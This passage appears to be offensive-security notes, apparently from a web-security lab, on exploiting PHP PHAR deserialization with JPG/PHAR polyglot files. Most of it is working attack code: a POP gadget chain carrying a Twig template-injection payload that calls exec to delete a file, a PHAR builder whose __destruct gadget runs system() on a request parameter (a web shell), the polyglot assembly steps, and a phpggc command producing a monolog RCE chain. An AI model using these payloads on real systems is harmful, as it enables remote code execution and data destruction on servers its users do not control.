- **PHP 8.0+**: `unserialize()` in PHAR metadata requires `allow_url_include=On`
- **PHP 7.4+**: Some hardening against specific polyglot techniques
- **Default configs**: Often disable dangerous wrappers
```ini
; php.ini requirements
allow_url_fopen=On      ; Usually default ON
allow_url_include=On    ; Usually default OFF (critical!)
```

### Manual 
go to `phar-jpg-polyglot`
```php
// pop exploit class
class CustomTemplate{};
class Blog{};
$object = new CustomTemplate;
$temp = new Blog;
$temp->user = "attacker";
$temp->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
$object->template_file_path = $temp;
```

full manual
```php
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('GIF89a<?php __HALT_COMPILER(); ?>');

// Add serialized object to metadata
class Evil {
    public function __destruct() {
        system($_GET['cmd']);
    }
}

$object = new Evil();
$phar->setMetadata($object);
$phar->stopBuffering();

// Add JPEG header to make polyglot
$jpeg = file_get_contents('real.jpg');
$phar = file_get_contents('exploit.phar');
file_put_contents('exploit.jpg', $jpeg . $phar);
?>
```

### Existing tool
```sh
# Creates a PHAR file in the PHAR format and stores it in /tmp/z.phar
./phpggc -p phar -o /tmp/z.phar monolog/rce1 system id
```